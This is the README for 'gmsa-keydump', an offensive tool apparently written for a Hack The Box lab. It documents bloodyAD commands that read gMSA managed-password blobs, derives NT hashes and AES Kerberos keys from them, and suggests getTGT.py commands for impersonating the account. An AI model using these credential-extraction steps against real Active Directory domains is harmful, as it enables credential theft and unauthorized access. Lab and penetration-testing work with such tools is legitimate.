# gmsa-keydump

> gMSA password blob parser and AES key deriver for Kerberos-only environments  
> By **Nitel** ([@nitelphyoe](https://github.com/nitelphyoe))

---

## Story

While working through an Insane-rated HTB Season 10 box (PingPong), I hit a wall — the target AD environment had NTLM completely disabled, forcing everything through Kerberos. To authenticate as a gMSA account I needed AES keys, but every modern tool I tried only returned the NT hash, and older tools weren't built with Kerberos-only environments in mind.

After hours of debugging salt formats, blob parsing, and UTF encoding, I finally cracked it. I made this tool by refactoring the well-known [gMSADumper](https://github.com/micahvandeusen/gMSADumper) with the help of Claude — cleaned up, repackaged, and built to handle both bloodyAD output formats out of the box.

---

## Why

When targeting hardened AD environments with **NTLM disabled**, you need AES keys to get a TGT for a gMSA account. Standard tools either derive keys incorrectly or don't handle the gMSA AES derivation.

This tool handles both blob formats output by bloodyAD:

- `--attr msDS-ManagedPassword` → pre-cut password bytes
- `--attr msDS-ManagedPassword --raw` → full `MSDS-MANAGEDPASSWORD_BLOB`

---

## Install

```bash
pipx install git+https://github.com/nitelphyoe/gmsa-keydump
```

Or with pip:

```bash
pip install git+https://github.com/nitelphyoe/gmsa-keydump
```

---

## Usage

```
gmsa-keydump [-h] (-f FILE | -b B64) -s SAM -d DOMAIN [--raw-blob] [--no-banner]
```

### Options

| Flag          | Description                                                           |
| ------------- | --------------------------------------------------------------------- |
| `-f FILE`     | Path to base64-encoded blob file                                      |
| `-b B64`      | Inline base64 blob string                                             |
| `-s SAM`      | sAMAccountName of the gMSA (e.g. `P_gMSA$`)                           |
| `-d DOMAIN`   | DNS domain of the gMSA (e.g. `nitel.htb`)                             |
| `--raw-blob`  | Input is full `MSDS-MANAGEDPASSWORD_BLOB` (use with bloodyAD `--raw`) |
| `--no-banner` | Suppress banner                                                       |

---

## Examples

### From bloodyAD `--raw` (full blob)

```bash
# Dump the raw blob
bloodyAD --host dc01.nitel.htb -d nitel.htb -u user -k \
  get object 'P_gMSA$' --attr msDS-ManagedPassword --raw \
  | grep msDS-ManagedPassword | awk '{print $2}' > gmsa_raw.b64

# Derive keys
gmsa-keydump -f gmsa_raw.b64 -s 'P_gMSA$' -d nitel.htb --raw-blob
```

### From bloodyAD without `--raw` (pre-cut)

```bash
bloodyAD --host dc01.nitel.htb -d nitel.htb -u user -k \
  get object 'P_gMSA$' --attr msDS-ManagedPassword \
  | grep msDS-ManagedPassword | awk '{print $2}' > gmsa_cut.b64

gmsa-keydump -f gmsa_cut.b64 -s 'P_gMSA$' -d nitel.htb
```

### Inline base64

```bash
gmsa-keydump -b 'AQAAACQCAAA...' -s 'P_gMSA$' -d nitel.htb --raw-blob
```

---

## Output

```
  __ _ _ __ ___  ___  __ _       _
 / _` | '_ ` _ \/ __|/ _` |     | |
| (_| | | | | | \__ \ (_| |  _  | | _____ _   _
 \__, |_| |_| |_|___/\__,_| (_) |_|/ / _ \ | | |
  __/ |                            _   < __/ |_| |
 |___/  dump                      (_)_|\_\___|\__, |
                                               __/ |
  gMSA AES Key Deriver  -  by Nitel          |___/

[*] Mode:            raw blob (MSDS-MANAGEDPASSWORD_BLOB)
[*] Blob version:    1
[*] Blob total len:  548 bytes (actual: 548)
[*] cur_off=16, prev_off=274
[*] SAM:             P_gMSA$
[*] Domain:          nitel.htb
[*] Password length: 256 bytes

[*] Salt:            nitel.htbhostp_gmsa.nitel.htb
[+] NT Hash:         4b85a2a049588810c1267e4018b07a07
[+] AES128:          <aes128>
[+] AES256:          <aes256>

[*] Suggested commands:
    getTGT.py 'nitel.htb/P_gMSA$' -aesKey <aes256> -dc-ip <DC_IP>
    getTGT.py 'nitel.htb/P_gMSA$' -hashes :<nt> -dc-ip <DC_IP>
```

---

## License

MIT — see [LICENSE](LICENSE)
